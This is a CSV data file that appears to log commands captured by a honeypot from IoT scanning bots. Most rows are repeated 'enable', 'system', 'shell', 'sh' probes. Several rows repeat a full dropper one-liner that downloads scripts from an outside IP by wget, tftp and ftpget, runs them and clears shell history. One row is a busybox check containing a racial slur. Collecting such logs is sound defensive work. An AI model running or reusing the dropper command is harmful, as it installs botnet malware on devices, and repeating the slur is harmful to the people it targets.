id,command,connections_id
11589,shell,102145
11590,sh,102145
11591,enable,102191
11592,system,102191
11593,shell,102191
11594,sh,102191
11595,enable,102247
11596,system,102247
11597,shell,102247
11598,sh,102247
11599,enable,102248
11600,system,102248
11601,shell,102248
11602,sh,102248
11603,enable,102249
11604,system,102249
11605,shell,102249
11606,sh,102249
11607,"Accept: */*",102261
11608,enable,102288
11609,system,102288
11610,shell,102288
11611,sh,102288
11612,enable,102300
11613,system,102300
11614,shell,102300
11615,sh,102300
11616,enable,102301
11617,system,102301
11618,shell,102301
11619,sh,102301
11620,enable,102305
11621,system,102305
11622,shell,102305
11623,sh,102305
11624,enable,102316
11625,system,102316
11626,shell,102316
11627,sh,102316
11628,enable,102317
11629,system,102317
11630,shell,102317
11631,sh,102317
11632,enable,102428
11633,system,102428
11634,shell,102428
11635,sh,102428
11636,enable,102429
11637,system,102429
11638,shell,102429
11639,sh,102429
11640,enable,102469
11641,system,102469
11642,shell,102469
11643,sh,102469
11644,enable,102494
11645,system,102494
11646,shell,102494
11647,sh,102494
11648,enable,102607
11649,system,102607
11650,shell,102607
11651,sh,102607
11652,enable,102650
11653,system,102650
11654,shell,102650
11655,sh,102650
11656,enable,102713
11657,system,102713
11658,shell,102713
11659,sh,102713
11660,enable,102806
11661,system,102806
11662,shell,102806
11663,sh,102806
11664,enable,102821
11665,system,102821
11666,shell,102821
11667,sh,102821
11668,enable,102875
11669,system,102875
11670,shell,102875
11671,sh,102875
11672,enable,102876
11673,system,102876
11674,shell,102876
11675,sh,102876
11676,sh,103018
11677,shell,103018
11678,"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://102.165.48.81/njs.sh; chmod +x njs.sh; sh njs.sh; tftp 102.165.48.81 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 102.165.48.81; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 102.165.48.81 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf njs.sh tftp1.sh tftp2.sh ftp1.sh;history -c",103018
11679,sh,103018
11680,enable,103042
11681,system,103042
11682,shell,103042
11683,sh,103042
11684,enable,103061
11685,system,103061
11686,shell,103061
11687,sh,103061
11688,enable,103102
11689,system,103102
11690,shell,103102
11691,sh,103102
11692,enable,103141
11693,system,103141
11694,shell,103141
11695,sh,103141
11696,sh,103148
11697,shell,103148
11698,"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://102.165.48.81/njs.sh; chmod +x njs.sh; sh njs.sh; tftp 102.165.48.81 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 102.165.48.81; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 102.165.48.81 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf njs.sh tftp1.sh tftp2.sh ftp1.sh;history -c",103148
11699,sh,103148
11700,enable,103157
11701,system,103157
11702,shell,103157
11703,sh,103157
11704,enable,103168
11705,system,103168
11706,shell,103168
11707,sh,103168
11708,enable,103169
11709,system,103169
11710,shell,103169
11711,sh,103169
11712,sh,103206
11713,shell,103206
11714,enable,103547
11715,system,103547
11716,shell,103547
11717,sh,103547
11718,enable,103661
11719,system,103661
11720,shell,103661
11721,sh,103661
11722,enable,103677
11723,system,103677
11724,shell,103677
11725,sh,103677
11726,enable,103678
11727,system,103678
11728,shell,103678
11729,sh,103678
11730,enable,103693
11731,system,103693
11732,shell,103693
11733,sh,103693
11734,enable,103716
11735,system,103716
11736,shell,103716
11737,sh,103716
11738,enable,103753
11739,system,103753
11740,shell,103753
11741,sh,103753
11742,enable,103805
11743,system,103805
11744,shell,103805
11745,sh,103805
11746,enable,103833
11747,system,103833
11748,shell,103833
11749,sh,103833
11750,enable,103834
11751,system,103834
11752,shell,103834
11753,sh,103834
11754,enable,103845
11755,system,103845
11756,shell,103845
11757,sh,103845
11758,enable,103852
11759,system,103852
11760,shell,103852
11761,sh,103852
11762,enable,103864
11763,system,103864
11764,shell,103864
11765,sh,103864
11766,enable,103867
11767,system,103867
11768,shell,103867
11769,sh,103867
11770,enable,103894
11771,system,103894
11772,shell,103894
11773,sh,103894
11774,enable,103919
11775,system,103919
11776,shell,103919
11777,sh,103919
11778,enable,103920
11779,system,103920
11780,shell,103920
11781,sh,103920
11782,enable,103925
11783,system,103925
11784,shell,103925
11785,sh,103925
11786,enable,103941
11787,system,103941
11788,shell,103941
11789,sh,103941
11790,enable,103943
11791,system,103943
11792,shell,103943
11793,sh,103943
11794,enable,104164
11795,system,104164
11796,shell,104164
11797,sh,104164
11798,enable,104165
11799,system,104165
11800,shell,104165
11801,sh,104165
11802,enable,104170
11803,enable,104169
11804,system,104170
11805,system,104169
11806,shell,104170
11807,shell,104169
11808,sh,104170
11809,sh,104169
11810,enable,104181
11811,system,104181
11812,shell,104181
11813,sh,104181
11814,enable,104182
11815,system,104182
11816,shell,104182
11817,sh,104182
11818,enable,104183
11819,system,104183
11820,shell,104183
11821,sh,104183
11822,enable,104195
11823,system,104195
11824,shell,104195
11825,sh,104195
11826,enable,104197
11827,system,104197
11828,shell,104197
11829,sh,104197
11830,enable,104200
11831,system,104200
11832,shell,104200
11833,sh,104200
11834,enable,104322
11835,system,104322
11836,shell,104322
11837,sh,104322
11838,enable,104338
11839,system,104338
11840,shell,104338
11841,sh,104338
11842,enable,104339
11843,system,104339
11844,shell,104339
11845,sh,104339
11846,enable,104340
11847,system,104340
11848,shell,104340
11849,sh,104340
11850,enable,104431
11851,system,104431
11852,shell,104431
11853,sh,104431
11854,enable,104498
11855,system,104498
11856,shell,104498
11857,sh,104498
11858,enable,104576
11859,system,104576
11860,shell,104576
11861,sh,104576
11862,enable,104748
11863,system,104748
11864,shell,104748
11865,sh,104748
11866,enable,104779
11867,system,104779
11868,shell,104779
11869,sh,104779
11870,enable,104780
11871,system,104780
11872,shell,104780
11873,sh,104780
11874,enable,104785
11875,system,104785
11876,shell,104785
11877,sh,104785
11878,enable,104793
11879,system,104793
11880,shell,104793
11881,sh,104793
11882,enable,104794
11883,system,104794
11884,shell,104794
11885,sh,104794
11886,enable,104827
11887,system,104827
11888,shell,104827
11889,sh,104827
11890,enable,104828
11891,system,104828
11892,shell,104828
11893,sh,104828
11894,enable,104833
11895,system,104833
11896,shell,104833
11897,sh,104833
11898,enable,104845
11899,system,104845
11900,shell,104845
11901,sh,104845
11902,enable,104877
11903,system,104877
11904,shell,104877
11905,sh,104877
11906,enable,105031
11907,system,105031
11908,shell,105031
11909,sh,105031
11910,enable,105049
11911,system,105049
11912,shell,105049
11913,sh,105049
11914,enable,105136
11915,system,105136
11916,shell,105136
11917,sh,105136
11918,enable,105146
11919,system,105146
11920,shell,105146
11921,sh,105146
11922,enable,105148
11923,system,105148
11924,shell,105148
11925,sh,105148
11926,enable,105156
11927,system,105156
11928,shell,105156
11929,sh,105156
11930,enable,105185
11931,system,105185
11932,shell,105185
11933,sh,105185
11934,enable,105193
11935,system,105193
11936,shell,105193
11937,sh,105193
11938,sh,105319
11939,shell,105319
11940,"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://102.165.48.81/njs.sh; chmod +x njs.sh; sh njs.sh; tftp 102.165.48.81 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 102.165.48.81; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 102.165.48.81 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf njs.sh tftp1.sh tftp2.sh ftp1.sh;history -c",105319
11941,sh,105319
11942,enable,105334
11943,system,105334
11944,shell,105334
11945,sh,105334
11946,enable,105390
11947,system,105390
11948,shell,105390
11949,sh,105390
11950,enable,105431
11951,system,105431
11952,shell,105431
11953,sh,105431
11954,enable,105571
11955,system,105571
11956,shell,105571
11957,sh,105571
11958,enable,106719
11959,system,106719
11960,shell,106719
11961,sh,106719
11962,enable,107082
11963,system,107082
11964,shell,107082
11965,sh,107082
11966,enable,107193
11967,system,107193
11968,shell,107193
11969,sh,107193
11970,enable,107234
11971,system,107234
11972,shell,107234
11973,sh,107234
11974,enable,107309
11975,system,107309
11976,shell,107309
11977,sh,107309
11978,enable,107345
11979,system,107345
11980,shell,107345
11981,sh,107345
11982,enable,107362
11983,system,107362
11984,shell,107362
11985,sh,107362
11986,enable,107478
11987,system,107478
11988,shell,107478
11989,sh,107478
11990,enable,107482
11991,system,107482
11992,shell,107482
11993,sh,107482
11994,enable,107508
11995,system,107508
11996,shell,107508
11997,sh,107508
11998,enable,107522
11999,system,107522
12000,shell,107522
12001,sh,107522
12002,enable,108097
12003,system,108097
12004,shell,108097
12005,sh,108097
12006,enable,108260
12007,system,108260
12008,shell,108260
12009,sh,108260
12010,enable,108356
12011,system,108356
12012,shell,108356
12013,sh,108356
12014,enable,108567
12015,system,108567
12016,shell,108567
12017,sh,108567
12018,enable,108679
12019,system,108679
12020,shell,108679
12021,sh,108679
12022,enable,108680
12023,system,108680
12024,shell,108680
12025,sh,108680
12026,enable,108681
12027,system,108681
12028,shell,108681
12029,sh,108681
12030,enable,108778
12031,system,108778
12032,shell,108778
12033,sh,108778
12034,enable,108839
12035,system,108839
12036,shell,108839
12037,sh,108839
12038,enable,108916
12039,system,108916
12040,shell,108916
12041,sh,108916
12042,enable,108991
12043,system,108991
12044,shell,108991
12045,sh,108991
12046,sh,109115
12047,shell,109115
12048,"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://102.165.48.81/njs.sh; chmod +x njs.sh; sh njs.sh; tftp 102.165.48.81 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 102.165.48.81; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 102.165.48.81 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf njs.sh tftp1.sh tftp2.sh ftp1.sh;history -c",109115
12049,sh,109115
12050,enable,109244
12051,system,109244
12052,shell,109244
12053,sh,109244
12054,enable,109279
12055,system,109279
12056,shell,109279
12057,sh,109279
12058,enable,109296
12059,system,109296
12060,shell,109296
12061,sh,109296
12062,enable,109331
12063,system,109331
12064,shell,109331
12065,sh,109331
12066,enable,109350
12067,system,109350
12068,shell,109350
12069,sh,109350
12070,enable,109449
12071,system,109449
12072,shell,109449
12073,sh,109449
12074,enable,109495
12075,system,109495
12076,shell,109495
12077,sh,109495
12078,enable,109504
12079,system,109504
12080,shell,109504
12081,sh,109504
12082,enable,109564
12083,system,109564
12084,shell,109564
12085,sh,109564
12086,enable,109622
12087,system,109622
12088,shell,109622
12089,sh,109622
12090,enable,109944
12091,system,109944
12092,shell,109944
12093,sh,109944
12094,enable,110019
12095,system,110019
12096,shell,110019
12097,sh,110019
12098,enable,110069
12099,system,110069
12100,shell,110069
12101,sh,110069
12102,enable,110103
12103,system,110103
12104,shell,110103
12105,sh,110103
12106,enable,110173
12107,system,110173
12108,shell,110173
12109,sh,110173
12110,sh,110182
12111,shell,110182
12112,"/bin/busybox NIGGER",110182
12113,enable,110184
12114,system,110184
12115,shell,110184
12116,sh,110184
12117,enable,110186
12118,system,110186
12119,shell,110186
12120,sh,110186
12121,enable,110187
12122,system,110187
12123,shell,110187
12124,sh,110187
12125,enable,110191
12126,system,110191
12127,shell,110191
12128,sh,110191
12129,enable,110200
12130,system,110200
12131,shell,110200
12132,sh,110200
12133,enable,110252
12134,system,110252
12135,shell,110252
12136,sh,110252
12137,enable,110346
12138,system,110346
12139,shell,110346
12140,sh,110346
12141,enable,110357
12142,system,110357
12143,shell,110357
12144,sh,110357
12145,enable,110421
12146,system,110421
12147,shell,110421
12148,sh,110421
12149,enable,110501
12150,system,110501
12151,shell,110501
12152,sh,110501
12153,enable,110506
12154,system,110506
12155,shell,110506
12156,sh,110506
12157,enable,110554
12158,system,110554
12159,shell,110554
12160,sh,110554
12161,enable,110738
12162,system,110738
12163,shell,110738
12164,sh,110738
12165,sh,110760
12166,shell,110760
12167,"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://102.165.48.81/njs.sh; chmod +x njs.sh; sh njs.sh; tftp 102.165.48.81 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 102.165.48.81; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 102.165.48.81 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf njs.sh tftp1.sh tftp2.sh ftp1.sh;history -c",110760
12168,sh,110760
12169,enable,110848
12170,system,110848
12171,shell,110848
12172,sh,110848
12173,enable,110885
12174,system,110885
12175,shell,110885
12176,sh,110885
12177,enable,110915
12178,system,110915
12179,shell,110915
12180,sh,110915
12181,enable,110916
12182,system,110916
12183,shell,110916
12184,sh,110916
12185,enable,110943
12186,system,110943
12187,shell,110943
12188,sh,110943
12189,enable,110947
12190,system,110947
12191,shell,110947
12192,sh,110947
12193,enable,110950
12194,system,110950
12195,shell,110950
12196,sh,110950
12197,enable,110951
12198,system,110951
12199,shell,110951
12200,sh,110951
12201,enable,111009
12202,system,111009
12203,shell,111009
12204,sh,111009
12205,enable,111020
12206,system,111020
12207,shell,111020
12208,sh,111020
12209,enable,111072
12210,system,111072
12211,shell,111072
12212,sh,111072
12213,enable,111076
12214,system,111076
12215,shell,111076
12216,sh,111076
12217,enable,111204
12218,system,111204
12219,shell,111204
12220,sh,111204
12221,enable,111465
12222,system,111465
12223,shell,111465
12224,sh,111465
12225,enable,111476
12226,system,111476
12227,shell,111476
12228,sh,111476
12229,enable,111477
12230,system,111477
12231,shell,111477
12232,sh,111477
12233,enable,111478
12234,system,111478
12235,shell,111478
12236,sh,111478
12237,enable,111591
12238,system,111591
12239,shell,111591
12240,sh,111591
12241,enable,111885
12242,system,111885
12243,shell,111885
12244,sh,111885
12245,enable,111886
12246,system,111886
12247,shell,111886
12248,sh,111886
12249,enable,111920
12250,system,111920
12251,shell,111920
12252,sh,111920
12253,enable,112414
12254,system,112414
12255,shell,112414
12256,sh,112414
12257,enable,112435
12258,system,112435
12259,shell,112435
12260,sh,112435
12261,enable,112744
12262,system,112744
12263,shell,112744
12264,sh,112744
12265,enable,112756
12266,system,112756
12267,shell,112756
12268,sh,112756
12269,enable,112832
12270,system,112832
12271,shell,112832
12272,sh,112832
12273,enable,112858
12274,system,112858
12275,shell,112858
12276,sh,112858
12277,enable,112905
12278,system,112905
12279,shell,112905
12280,sh,112905
12281,enable,112971
12282,system,112971
12283,shell,112971
12284,sh,112971
12285,enable,112972
12286,system,112972
12287,shell,112972
12288,sh,112972
12289,enable,112974
12290,system,112974
12291,shell,112974
12292,sh,112974
12293,enable,112983
12294,system,112983
12295,shell,112983
12296,sh,112983
12297,enable,112997
12298,system,112997
12299,shell,112997
12300,sh,112997
12301,enable,112999
12302,system,112999
12303,shell,112999
12304,sh,112999
12305,enable,113048
12306,system,113048
12307,shell,113048
12308,sh,113048
12309,enable,113170
12310,system,113170
12311,shell,113170
12312,sh,113170
12313,enable,113171
12314,system,113171
12315,shell,113171
12316,sh,113171
12317,enable,113184
12318,system,113184
12319,shell,113184
12320,sh,113184
12321,enable,113404
12322,system,113404
12323,shell,113404
12324,sh,113404
12325,enable,113505
12326,system,113505
12327,shell,113505
12328,sh,113505
12329,enable,113571
12330,system,113571
12331,shell,113571
12332,sh,113571
12333,enable,113586
12334,system,113586
12335,shell,113586
12336,sh,113586
12337,enable,113596
12338,system,113596
12339,shell,113596
12340,sh,113596
12341,enable,113598
12342,system,113598
12343,shell,113598
12344,sh,113598
12345,enable,113611
12346,system,113611
12347,shell,113611
12348,sh,113611
12349,enable,113612
12350,system,113612
12351,shell,113612
12352,sh,113612
12353,enable,113665
12354,system,113665
12355,shell,113665
12356,sh,113665
12357,enable,113722
12358,system,113722
12359,shell,113722
12360,sh,113722
12361,enable,113734
12362,system,113734
12363,shell,113734
12364,sh,113734
12365,enable,113774
12366,system,113774
12367,shell,113774
12368,sh,113774
12369,enable,113783
12370,system,113783
12371,shell,113783
12372,sh,113783
12373,enable,113806
12374,system,113806
12375,shell,113806
12376,sh,113806
12377,enable,113813
12378,system,113813
12379,shell,113813
12380,sh,113813
12381,enable,113830
12382,system,113830
12383,shell,113830
12384,sh,113830
12385,enable,113884
12386,system,113884
12387,shell,113884
12388,sh,113884
12389,enable,113893
12390,system,113893
12391,shell,113893
12392,sh,113893
12393,enable,113907
12394,system,113907
12395,shell,113907
12396,sh,113907
12397,enable,113908
12398,system,113908
12399,shell,113908
12400,sh,113908
12401,enable,113919
12402,system,113919
12403,shell,113919
12404,sh,113919
12405,enable,113982
12406,system,113982
12407,shell,113982
12408,sh,113982
12409,enable,114060
12410,system,114060
12411,shell,114060
12412,sh,114060
12413,enable,114062
12414,system,114062
12415,shell,114062
12416,sh,114062
12417,enable,114065
12418,system,114065
12419,shell,114065
12420,sh,114065
12421,enable,114066
12422,system,114066
12423,shell,114066
12424,sh,114066
12425,enable,114091
12426,system,114091
12427,shell,114091
12428,sh,114091
12429,enable,114199
12430,system,114199
12431,shell,114199
12432,sh,114199
12433,enable,114219
12434,system,114219
12435,shell,114219
12436,sh,114219
12437,enable,114279
12438,system,114279
12439,shell,114279
12440,sh,114279
12441,enable,114280
12442,system,114280
12443,shell,114280
12444,sh,114280
12445,enable,114281
12446,system,114281
12447,shell,114281
12448,sh,114281
12449,enable,114334
12450,system,114334
12451,shell,114334
12452,sh,114334
12453,enable,114335
12454,system,114335
12455,shell,114335
12456,sh,114335
12457,enable,114340
12458,system,114340
12459,shell,114340
12460,sh,114340
12461,enable,114341
12462,system,114341
12463,shell,114341
12464,sh,114341
12465,enable,114342
12466,system,114342
12467,shell,114342
12468,sh,114342
12469,enable,114343
12470,system,114343
12471,shell,114343
12472,sh,114343
12473,enable,114354
12474,system,114354
12475,shell,114354
12476,sh,114354
12477,enable,114356
12478,system,114356
12479,shell,114356
12480,sh,114356
12481,enable,114357
12482,system,114357
12483,shell,114357
12484,sh,114357
12485,enable,114388
12486,system,114388
12487,shell,114388
12488,sh,114388
12489,"%-12345X@PJL INFO ID",114410
12490,"%-12345X",114410
12491,"User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",114411
12492,fox.version=s:1.0,114433
12493,enable,114656
12494,system,114656
12495,shell,114656
12496,sh,114656
12497,enable,114670
12498,system,114670
12499,shell,114670
12500,sh,114670
12501,enable,114700
12502,system,114700
12503,shell,114700
12504,sh,114700
12505,enable,114732
12506,system,114732
12507,shell,114732
12508,sh,114732
12509,enable,114739
12510,system,114739
12511,shell,114739
12512,sh,114739
12513,enable,114777
12514,system,114777
12515,shell,114777
12516,sh,114777
12517,enable,114819
12518,system,114819
12519,shell,114819
12520,sh,114819
12521,enable,114930
12522,system,114930
12523,shell,114930
12524,sh,114930
12525,enable,114979
12526,system,114979
12527,shell,114979
12528,sh,114979
12529,enable,115003
12530,system,115003
12531,shell,115003
12532,sh,115003
12533,enable,115014
12534,system,115014
12535,shell,115014
12536,sh,115014
12537,enable,115033
12538,system,115033
12539,shell,115033
12540,sh,115033
12541,enable,115053
12542,system,115053
12543,shell,115053
12544,sh,115053
12545,enable,115065
12546,system,115065
12547,shell,115065
12548,sh,115065
12549,enable,115066
12550,system,115066
12551,shell,115066
12552,sh,115066
12553,enable,115074
12554,system,115074
12555,shell,115074
12556,sh,115074
12557,enable,115080
12558,system,115080
12559,shell,115080
12560,sh,115080
12561,enable,115082
12562,system,115082
12563,shell,115082
12564,sh,115082
12565,enable,115110
12566,system,115110
12567,shell,115110
12568,sh,115110
12569,enable,115111
12570,system,115111
12571,shell,115111
12572,sh,115111
12573,enable,115125
12574,system,115125
12575,shell,115125
12576,sh,115125
12577,enable,115139
12578,system,115139
12579,shell,115139
12580,sh,115139
12581,enable,115150
12582,system,115150
12583,shell,115150
12584,sh,115150
12585,enable,115158
12586,system,115158
12587,shell,115158
12588,sh,115158
12589,enable,115165
12590,system,115165
12591,shell,115165
12592,sh,115165
12593,enable,115168
12594,system,115168
12595,shell,115168
12596,sh,115168
12597,enable,115370
12598,system,115370
12599,shell,115370
12600,sh,115370
12601,enable,115601
12602,system,115601
12603,shell,115601
12604,sh,115601
12605,enable,115650
12606,system,115650
12607,shell,115650
12608,sh,115650
12609,enable,115657
12610,system,115657
12611,shell,115657
12612,sh,115657
12613,enable,115793
12614,system,115793
12615,shell,115793
12616,sh,115793
12617,sh,115811
12618,shell,115811
12619,"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://102.165.48.81/njs.sh; chmod +x njs.sh; sh njs.sh; tftp 102.165.48.81 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 102.165.48.81; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 102.165.48.81 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf njs.sh tftp1.sh tftp2.sh ftp1.sh;history -c",115811
12620,sh,115811
12621,enable,115812
12622,system,115812
12623,shell,115812
12624,sh,115812
12625,enable,115854
12626,system,115854
12627,shell,115854
12628,sh,115854
12629,enable,115878
12630,system,115878
12631,shell,115878
12632,sh,115878
12633,enable,115881
12634,system,115881
12635,shell,115881
12636,sh,115881
12637,enable,115933
12638,system,115933
12639,shell,115933
12640,sh,115933
12641,enable,116053
12642,system,116053
12643,shell,116053
12644,sh,116053
12645,enable,116085
12646,system,116085
12647,shell,116085
12648,sh,116085
12649,enable,116097
12650,system,116097
12651,shell,116097
12652,sh,116097
12653,enable,116134
12654,system,116134
12655,shell,116134
12656,sh,116134
12657,enable,116195
12658,system,116195
12659,shell,116195
12660,sh,116195
12661,enable,116252
12662,system,116252
12663,shell,116252
12664,sh,116252
12665,enable,116266
12666,system,116266
12667,shell,116266
12668,sh,116266
12669,enable,116362
12670,system,116362
12671,shell,116362
12672,sh,116362
12673,enable,116395
12674,system,116395
12675,shell,116395
12676,sh,116395
12677,enable,116435
12678,system,116435
12679,shell,116435
12680,sh,116435
12681,enable,116438
12682,system,116438
12683,shell,116438
12684,sh,116438
12685,enable,116446
12686,system,116446
12687,shell,116446
12688,sh,116446
12689,enable,116477
12690,system,116477
12691,shell,116477
12692,sh,116477
12693,enable,116595
12694,system,116595
12695,shell,116595
12696,sh,116595
12697,enable,116650
12698,system,116650
12699,shell,116650
12700,sh,116650
12701,enable,116654
12702,system,116654
12703,shell,116654
12704,sh,116654
12705,enable,116764
12706,system,116764
12707,shell,116764
12708,sh,116764
12709,enable,116803
12710,system,116803
12711,shell,116803
12712,sh,116803
12713,sh,116949
12714,shell,116949
12715,enable,116995
12716,system,116995
12717,shell,116995
12718,sh,116995
12719,enable,117034
12720,system,117034
12721,shell,117034
12722,sh,117034
12723,enable,117074
12724,system,117074
12725,shell,117074
12726,sh,117074
12727,enable,117082
12728,system,117082
12729,shell,117082
12730,sh,117082
12731,enable,117176
12732,system,117176
12733,shell,117176
12734,sh,117176
12735,enable,117189
12736,system,117189
12737,shell,117189
12738,sh,117189
12739,enable,117194
12740,system,117194
12741,shell,117194
12742,sh,117194
12743,enable,117272
12744,system,117272
12745,shell,117272
12746,sh,117272
12747,enable,117294
12748,system,117294
12749,shell,117294
12750,sh,117294
12751,enable,117296
12752,system,117296
12753,shell,117296
12754,sh,117296
12755,enable,117358
12756,system,117358
12757,shell,117358
12758,sh,117358
12759,enable,117485
12760,system,117485
12761,shell,117485
12762,sh,117485
12763,enable,117600
12764,system,117600
12765,shell,117600
12766,sh,117600
12767,enable,117663
12768,system,117663
12769,shell,117663
12770,sh,117663
12771,enable,118065
12772,system,118065
12773,shell,118065
12774,sh,118065
12775,enable,118091
12776,system,118091
12777,shell,118091
12778,sh,118091
12779,enable,118136
12780,system,118136
12781,shell,118136
12782,sh,118136
12783,enable,118145
12784,system,118145
12785,shell,118145
12786,sh,118145
12787,enable,118146
12788,system,118146
12789,shell,118146
12790,sh,118146
12791,enable,118182
12792,system,118182
12793,shell,118182
12794,sh,118182
12795,enable,118183
12796,system,118183
12797,shell,118183
12798,sh,118183
12799,enable,119300
12800,system,119300
12801,shell,119300
12802,sh,119300
12803,enable,119456
12804,system,119456
12805,shell,119456
12806,sh,119456
12807,enable,119488
12808,system,119488
12809,shell,119488
12810,sh,119488
12811,enable,119557
12812,system,119557
12813,shell,119557
12814,sh,119557
12815,enable,119625
12816,system,119625
12817,shell,119625
12818,sh,119625
12819,enable,119760
12820,system,119760
12821,shell,119760
12822,sh,119760
12823,enable,119785
12824,system,119785
12825,shell,119785
12826,sh,119785
12827,enable,119787
12828,system,119787
12829,shell,119787
12830,sh,119787
12831,enable,119815
12832,system,119815
12833,shell,119815
12834,sh,119815
12835,enable,119816
12836,system,119816
12837,shell,119816
12838,sh,119816
12839,enable,119871
12840,system,119871
12841,shell,119871
12842,sh,119871
12843,"User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36",119967
12844,enable,119983
12845,system,119983
12846,shell,119983
12847,sh,119983
12848,enable,120014
12849,system,120014
12850,shell,120014
12851,sh,120014
12852,enable,120025
12853,system,120025
12854,shell,120025
12855,sh,120025
12856,enable,120042
12857,system,120042
12858,shell,120042
12859,sh,120042
12860,sh,120087
12861,shell,120087
12862,"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://102.165.48.81/njs.sh; chmod +x njs.sh; sh njs.sh; tftp 102.165.48.81 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 102.165.48.81; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 102.165.48.81 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf njs.sh tftp1.sh tftp2.sh ftp1.sh;history -c",120087
12863,sh,120087
12864,enable,120088
12865,system,120088
12866,shell,120088
12867,sh,120088
12868,enable,120210
12869,system,120210
12870,shell,120210
12871,sh,120210
12872,enable,120211
12873,system,120211
12874,shell,120211
12875,sh,120211
12876,enable,120212
12877,system,120212
12878,shell,120212
12879,sh,120212
12880,enable,120282
12881,system,120282
12882,shell,120282
12883,sh,120282
12884,enable,120284
12885,system,120284
12886,shell,120284
12887,sh,120284
12888,enable,120301
12889,system,120301
12890,shell,120301
12891,sh,120301
12892,enable,120307
12893,system,120307
12894,shell,120307
12895,sh,120307
12896,enable,120419
12897,system,120419
12898,shell,120419
12899,sh,120419
12900,enable,120469
12901,system,120469
12902,shell,120469
12903,sh,120469
12904,enable,120523
12905,system,120523
12906,shell,120523
12907,sh,120523
12908,enable,120562
12909,system,120562
12910,shell,120562
12911,sh,120562
12912,enable,120568
12913,system,120568
12914,shell,120568
12915,sh,120568
12916,enable,120569
12917,system,120569
12918,shell,120569
12919,sh,120569
12920,enable,120606
12921,system,120606
12922,shell,120606
12923,sh,120606
12924,enable,120644
12925,system,120644
12926,shell,120644
12927,sh,120644
12928,enable,120721
12929,system,120721
12930,shell,120721
12931,sh,120721
12932,enable,120731
12933,system,120731
12934,shell,120731
12935,sh,120731
12936,enable,120760
12937,system,120760
12938,shell,120760
12939,sh,120760
12940,enable,120853
12941,system,120853
12942,shell,120853
12943,sh,120853
12944,enable,120917
12945,system,120917
12946,shell,120917
12947,sh,120917
12948,enable,120918
12949,system,120918
12950,shell,120918
12951,sh,120918
12952,enable,120919
12953,system,120919
12954,shell,120919
12955,sh,120919
12956,enable,120992
12957,system,120992
12958,shell,120992
12959,sh,120992
12960,enable,121051
12961,system,121051
12962,shell,121051
12963,sh,121051
12964,enable,121074
12965,system,121074
12966,shell,121074
